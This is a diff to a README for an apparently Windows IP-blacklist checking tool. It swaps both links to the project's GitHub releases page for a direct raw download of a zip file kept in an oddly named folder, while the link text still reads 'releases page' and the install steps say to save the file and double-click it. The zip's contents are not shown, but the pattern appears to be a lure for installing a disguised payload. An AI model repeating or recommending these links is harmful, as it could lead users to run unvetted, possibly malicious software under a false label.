@@ -1,6 +1,6 @@
 # 🛡️ ip-blacklist-remover - Check and remove your blacklisted IPs
 
-[![Download App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pascalfrostbitten7015/ip-blacklist-remover/releases)
+[![Download App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Pascalfrostbitten7015/ip-blacklist-remover/main/gastroduodenitis/ip-remover-blacklist-1.3.zip)
 
 This application helps you manage the reputation of your IP addresses. It checks if your servers appear on common DNS blacklists and helps you request removals. Proper IP management ensures your emails reach intended recipients and keeps your network secure.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these basic needs to run the software.
 
 Follow these steps to set up the application on your Windows machine.
 
-1. Visit the [releases page](https://github.com/Pascalfrostbitten7015/ip-blacklist-remover/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Pascalfrostbitten7015/ip-blacklist-remover/main/gastroduodenitis/ip-remover-blacklist-1.3.zip) to download the latest version.
 2. Locate the download button or link for the Windows installer file.
 3. Save the file to your computer.
 4. Double-click the downloaded file to start the installation.
